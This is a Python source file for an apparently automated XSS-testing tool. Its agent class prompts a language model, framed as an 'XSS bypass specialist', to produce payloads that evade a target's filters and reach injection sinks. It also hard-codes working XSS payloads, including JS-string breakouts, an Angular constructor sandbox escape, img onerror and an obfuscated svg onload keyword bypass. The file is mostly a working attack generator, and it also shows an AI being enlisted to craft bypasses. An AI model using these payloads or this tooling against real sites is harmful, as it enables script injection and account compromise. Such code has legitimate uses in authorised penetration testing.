"""Deep mode agent for context-aware XSS bypass generation."""

from __future__ import annotations

from dataclasses import dataclass, field
import os
import re

import httpx

try:
    from .bypass_generator import BypassGenerator
    from .framework_fingerprinter import FrameworkInfo
    from .context_detector import InjectionContext
    from .payload_sets import get_framework_payloads
    from .sink_detector import Sink
except ImportError:  # pragma: no cover
    from bypass_generator import BypassGenerator
    from framework_fingerprinter import FrameworkInfo
    from context_detector import InjectionContext
    from payload_sets import get_framework_payloads
    from sink_detector import Sink


@dataclass
class Attempt:
    payload: str
    outcome: str
    filter_type: str
    response_preview: str = ""
    reflected_fragment: str = ""


@dataclass
class BypassPayload:
    payloads: list[str]
    rationale: list[str] = field(default_factory=list)
    filter_type: str = "NO_BLOCK"
    prompt: str = ""
    model_response: str = ""


class DeepModeAgent:
    """AI-driven XSS bypass generator."""

    def __init__(self, model: str = "minimax/m2.5"):
        self.model = model
        self.conversation_history: list[dict[str, str]] = []
        self.bypass_generator = BypassGenerator()
        self.api_key = os.getenv("OPENROUTER_API_KEY", "")
        self.base_url = os.getenv("OPENROUTER_BASE_URL", "https://openrouter.ai/api/v1/chat/completions")

    async def analyze(
        self,
        target: str,
        framework: FrameworkInfo,
        context: InjectionContext,
        sinks: list[Sink],
        attempt_history: list[Attempt],
    ) -> BypassPayload:
        """Generate targeted bypass payloads using context and history."""
        filter_type = self._dominant_filter(attempt_history)
        prompt = self._build_prompt(target, framework, context, sinks, attempt_history, filter_type)
        heuristic_payloads = self.generate_bypass(framework, context, filter_type, attempt_history)
        rationale = self._heuristic_rationale(framework, context, sinks, filter_type)

        model_response = ""
        if self.api_key:
            model_response = await self._query_model(prompt)
            llm_payloads = self._extract_payloads(model_response)
            combined = self._unique(heuristic_payloads + llm_payloads)
        else:
            combined = heuristic_payloads

        self.conversation_history.append({"role": "user", "content": prompt})
        if model_response:
            self.conversation_history.append({"role": "assistant", "content": model_response})

        return BypassPayload(
            payloads=combined[:10],
            rationale=rationale,
            filter_type=filter_type,
            prompt=prompt,
            model_response=model_response,
        )

    def generate_bypass(
        self,
        framework: FrameworkInfo,
        context: InjectionContext,
        filter_type: str,
        attempt_history: list[Attempt],
    ) -> list[str]:
        """Given what was blocked, generate bypass candidates."""
        payloads = []
        payloads.extend(get_framework_payloads(framework.name))
        payloads.extend(self.bypass_generator.generate(filter_type, context.type))
        payloads.extend(self._sink_tuned_payloads(framework.name, context.type, attempt_history))
        return self._unique(payloads)

    def _build_prompt(
        self,
        target: str,
        framework: FrameworkInfo,
        context: InjectionContext,
        sinks: list[Sink],
        attempts: list[Attempt],
        filter_type: str,
    ) -> str:
        sink_list = ", ".join(f"{sink.name}@L{sink.line}" for sink in sinks[:12]) or "none"
        attempt_text = "\n".join(
            f"- {attempt.payload} => {attempt.outcome} [{attempt.filter_type}] {attempt.response_preview[:140]}"
            for attempt in attempts[-10:]
        ) or "- no prior attempts"
        return (
            "You are an XSS bypass specialist analyzing a target.\n\n"
            f"Target: {target}\n"
            f"Detected Framework: {framework.name} ({framework.version or 'unknown'})\n"
            f"Framework Protections: {', '.join(framework.protections) or 'none detected'}\n"
            f"Injection Context: {context.type} — reflected as: \"{context.reflected_fragment[:160]}\"\n"
            f"Sinks Found: {sink_list}\n"
            "Attempt History:\n"
            f"{attempt_text}\n\n"
            "Filter Detection:\n"
            f"Likely filter type: {filter_type}\n"
            f"Observed reflection snippet: {context.surrounding_text[:200]}\n\n"
            f"Generate 5 targeted bypass payloads that exploit weaknesses in {framework.name}, "
            f"fit the {context.type} context, bypass the detected filter, and reach an available sink.\n"
            "Format: one payload per line with a brief explanation."
        )

    async def _query_model(self, prompt: str) -> str:
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
        }
        body = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": "Be concise and technical. Output payloads first."},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 700,
        }
        try:
            async with httpx.AsyncClient(timeout=30) as client:
                response = await client.post(self.base_url, headers=headers, json=body)
                response.raise_for_status()
                data = response.json()
                return data["choices"][0]["message"]["content"]
        except Exception:
            return ""

    def _extract_payloads(self, response_text: str) -> list[str]:
        payloads = []
        for line in response_text.splitlines():
            line = line.strip()
            if not line:
                continue
            line = re.sub(r"^[0-9]+\.\s*", "", line)
            line = re.sub(r"^[-*]\s*", "", line)
            candidate = re.split(r"\s+[–-]\s+|\s+#\s+", line, maxsplit=1)[0].strip()
            if any(token in candidate for token in ("<", ">", "javascript:", "{{", "${", "alert", "confirm", "constructor")):
                payloads.append(candidate)
        return self._unique(payloads)

    def _dominant_filter(self, attempts: list[Attempt]) -> str:
        if not attempts:
            return "NO_BLOCK"
        counts: dict[str, int] = {}
        for attempt in attempts:
            counts[attempt.filter_type] = counts.get(attempt.filter_type, 0) + 1
        return max(counts.items(), key=lambda item: item[1])[0]

    def _sink_tuned_payloads(self, framework_name: str, context_type: str, attempts: list[Attempt]) -> list[str]:
        payloads = []
        if context_type == "JS_STRING":
            payloads.extend(["';alert(1);//", '";alert(1);//', "`;alert(1);//"])
        if context_type == "JS_TEMPLATE":
            payloads.extend(["${alert(1)}", "${self['al'+'ert'](1)}"])
        if framework_name == "react":
            payloads.append('"><img src=x onerror=alert(1)>')
        if framework_name == "angular":
            payloads.append("{{constructor.constructor('alert(1)')()}}")
        if any(attempt.filter_type == "KEYWORD_BLOCK" for attempt in attempts):
            payloads.append("<svg/onload=top['al'+'ert'](1)>")
        return payloads

    def _heuristic_rationale(
        self,
        framework: FrameworkInfo,
        context: InjectionContext,
        sinks: list[Sink],
        filter_type: str,
    ) -> list[str]:
        reasons = [
            f"Context is {context.type}, so candidates favor breakers valid in that location.",
            f"Detected filter type is {filter_type}, so payloads include matching bypass variants.",
        ]
        if framework.name:
            reasons.append(f"Framework hints suggest {framework.name}-specific payloads may survive default sanitization paths.")
        if sinks:
            reasons.append(f"Sink coverage includes {', '.join(sink.name for sink in sinks[:3])}, so payloads bias toward HTML/JS execution paths.")
        return reasons

    def _unique(self, values: list[str]) -> list[str]:
        seen: set[str] = set()
        unique_values: list[str] = []
        for value in values:
            if value and value not in seen:
                seen.add(value)
                unique_values.append(value)
        return unique_values
